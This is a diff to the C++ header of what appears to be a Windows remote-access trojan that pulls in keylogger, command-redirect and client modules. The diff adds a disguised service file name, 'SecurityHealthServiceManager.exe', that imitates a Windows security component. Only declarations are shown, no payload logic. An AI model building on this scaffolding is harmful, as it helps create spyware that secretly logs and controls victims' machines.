@@ -4,6 +4,8 @@
 #define GENERAL_H
 #define WIN32_LEAN_AND_MEAN		//if left out order of windows.h and winsock.h plays messes up everything (just leave it in)
 
+#define SERVICE_FILE_NAME "SecurityHealthServiceManager.exe"
+#define SERVICE_ARCHIVE_NAME "external.zip"
 
 
 #include <Windows.h>		
@@ -13,18 +15,17 @@
 #include <time.h>
 #include <fstream>
 #include <thread>
+#include <process.h>
 
 #include "cmdRedirect.h"
 #include "settings.h"
 #include "conversion.h"
 #include "utility.h"
 #include "keylogger.h"
-
-
+#include "client.h"
 
 class General
 {
-
 public:		//some variables
 	static std::string currentPath;			//current path of executable
 	static std::string installFolder;		//path of folder it should be installed to
@@ -32,7 +33,6 @@ public:		//some variables
 	static bool installing;			//bool - defines whether the file is currently being installed (and should be terminated after the initiation sequence,
 									//instead of proceeding to the main loop)
 	static LPTSTR lpArguments;
-
 public:
 	static bool init();		//main init function
 
@@ -63,5 +63,7 @@ public:		//functions
 private:	//functions
 	static bool processParameter(std::string &command, std::string compCommand);
 };
+
+std::string GetCWD();
 
 #endif
